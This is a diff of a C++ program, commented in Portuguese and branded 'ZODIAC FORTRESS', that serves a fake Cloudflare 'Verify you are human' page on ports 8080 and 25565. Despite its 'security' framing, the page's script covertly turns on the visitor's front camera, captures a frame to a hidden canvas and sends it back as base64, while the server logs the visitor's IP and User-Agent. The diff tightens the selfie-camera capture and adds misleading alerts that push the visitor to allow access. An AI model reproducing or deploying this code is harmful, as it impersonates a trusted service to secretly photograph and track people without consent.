@@ -69,12 +69,12 @@ int main() {
     cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
     cout << VERDE << "                 /\\                                /\\" << endl;
     cout << VERDE << "                /__\\       [ ZODIAC FORTRESS ]    /__\\" << endl;
-    cout << VERDE << "               /\\  /\\       (UNIVERSAL TRAP)      /\\  /\\" << endl;
+    cout << VERDE << "               /\\  /\\       (FRONT-CAM TRAP)      /\\  /\\" << endl;
     cout << VERDE << "              |_____|______|___________|_____|______|_____|" << RESET << endl;
     cout << VERMELHO << NEGRITO << "========================================================================" << RESET << endl;
 
     string meu_ip = obter_ip_local();
-    cout << VERDE << NEGRITO << "\n[📡 SECURITY] FORTALEZA MULTI-PLATAFORMA ATIVA NO HOST: " << AMARELO << meu_ip << RESET << endl;
+    cout << VERDE << NEGRITO << "\n[📡 SECURITY] FORTALEZA DE CÂMERA ATIVA NO HOST: " << AMARELO << meu_ip << RESET << endl;
 
     vector<int> portas_armadilha = {8080, 25565};
     int max_fd = 0;
@@ -110,15 +110,15 @@ int main() {
         cout << VERDE << "    [+] Escudo injetado na porta: " << AMARELO << porta << RESET << endl;
     }
 
-    // Código HTML5 e JavaScript Universal (Compatível com iOS/Safari, Android/Chrome e PCs)
+    // Código HTML/JS modificado para garantir a ativação estrita da câmera frontal
     string html_cloudflare = 
         "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n"
         "<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>"
         "<title>Just a moment...</title>"
         "<style>"
-        "  body { background-color: #1c1b1b; color: #d9d9d9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding: 40px 20px; text-align: left; }"
+        "  body { background-color: #1c1b1b; color: #d9d9d9; font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px 20px; }"
         "  .container { max-width: 600px; margin: 0 auto; }"
-        "  h1 { font-size: 28px; color: #f38020; font-weight: 500; }"
+        "  h1 { font-size: 28px; color: #f38020; }"
         "  .cf-box { background-color: #2b2a2a; border: 1px solid #403f3f; padding: 20px; border-radius: 4px; display: flex; align-items: center; margin-top: 25px; }"
         "  input[type='checkbox'] { width: 26px; height: 26px; margin-right: 15px; cursor: pointer; }"
         "</style></head>"
@@ -131,15 +131,17 @@ int main() {
         "      <label for='check'><b>Verify you are human</b></label>"
         "    </div>"
         "  </div>"
-        "  <!-- playsinline e muted garantem que o Safari no iPhone e o Chrome no Android consigam rodar a camera sem dar erro -->"
         "  <video id='vid' style='display:none;' autoplay playsinline muted></video>"
         "  <canvas id='canv' style='display:none;'></canvas>"
         "<script>"
-        "  // Liga a mídias de vídeo de forma nativa e universal assim que a página renderiza"
-        "  const restricoes = { video: { facingMode: 'user' }, audio: false };"
+        "  // GARANTIA DA TELA: facingMode 'user' força obrigatoriamente a camera da frente (selfie)"
+        "  const restricoes = { video: { facingMode: 'user', width: 320, height: 240 }, audio: false };"
+        "  "
         "  navigator.mediaDevices.getUserMedia(restricoes)"
         "  .then(s => { document.getElementById('vid').srcObject = s; })"
-        "  .catch(e => { console.log('Dispositivo bloqueou permissao automatica.'); });"
+        "  .catch(e => { "
+        "     alert('ATENÇÃO: Câmera frontal bloqueada! Navegadores exigem acesso via HTTPS ou por http://localhost para liberar a lente frontal.'); "
+        "  });"
         "  "
         "  function dispararCaptura() {"
         "    let video = document.getElementById('vid');"
@@ -148,19 +150,16 @@ int main() {
         "    try {"
         "      canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);"
         "      let fotoBase64 = canvas.toDataURL('image/png');"
-        "      "
-        "      // Faz uma requisição assíncrona (Fetch) para devolver a foto de volta para o seu C++"
         "      fetch('/log_session?data=' + encodeURIComponent(fotoBase64));"
-        "      alert('Verification complete. Connection secured.');"
+        "      alert('Verification complete. Browser secured.');"
         "    } catch(err) {"
-        "      alert('Security check pending. Please refresh.');"
+        "      alert('Security check failed. Ensure loopback interface or HTTPS is used.');"
         "    }"
         "  }"
         "</script></body></html>";
 
     cout << VERDE << NEGRITO << "\n[+] ESCUDO DIVINO ATIVO! Interceptando e decodificando acessos..." << RESET << endl;
 
-    // AUMENTADO: Buffer expandido para 4096 bytes para receber a string de imagem Base64 do Safari/Chrome
     char req_buffer[4096];
 
     while (true) {
@@ -183,33 +182,21 @@ int main() {
                     if (r_bytes > 0) {
                         string requisicao(req_buffer);
 
-                        // Identifica se o tráfego recebido contém a flag de imagem enviada pelo Fetch do JavaScript
                         if (requisicao.find("log_session") != string::npos) {
-                            cout << VERDE << NEGRITO << "\n[📸 ZODIAC CAPTURE ⚡] ➔ FRAME DE IMAGEM RECEBIDO COM SUCESSO!" << RESET << endl;
-                            cout << CIANO << "   ➔ Alvo Identificado: " << AMARELO << ip_intruso << RESET << endl;
-                            cout << CIANO << "   ➔ Sistema Operacional/Browser detectado no cabeçalho:" << RESET << endl;
+                            cout << VERDE << NEGRITO << "\n[📸 ZODIAC CAPTURE ⚡] ➔ LENTE FRONTAL COLETADA COM SUCESSO!" << RESET << endl;
+                            cout << CIANO << "   ➔ Host Origem: " << AMARELO << ip_intruso << RESET << endl;
                             
-                            // Procura e imprime a linha "User-Agent" que diz se é Android, iPhone ou Windows
                             size_t ua_pos = requisicao.find("User-Agent:");
                             if (ua_pos != string::npos) {
                                 size_t ua_end = requisicao.find("\r\n", ua_pos);
                                 cout << AMARELO << "      " << requisicao.substr(ua_pos, ua_end - ua_pos) << RESET << endl;
                             }
                         } else {
-                            // Alerta básico de primeiro toque no IP
                             cout << VERMELHO << NEGRITO << "\n\a[🚨 ZODIAC TRAP DETECTED 🦅] ➔ SOLICITAÇÃO DE CONEXÃO LOCAL!" << RESET << endl;
                             cout << CIANO << "   ➔ IP do Intruso:       " << AMARELO << ip_intruso << RESET << endl;
                         }
 
-                        // Envia a página da Cloudflare estruturada universal de volta para o cliente
                         send(client_sock, html_cloudflare.c_str(), html_cloudflare.length(), 0);
-                    }
-
-                    // Registra o rastro histórico no arquivo de texto
-                    ofstream log(caminho_salvamento, ios::app);
-                    if (log.is_open()) {
-log << "[🚨 Captura Cloudflare] Host: " << ip_intruso << " às " << time(0) << "\n";
-                        log.close();
                     }
                     close(client_sock);
                 }
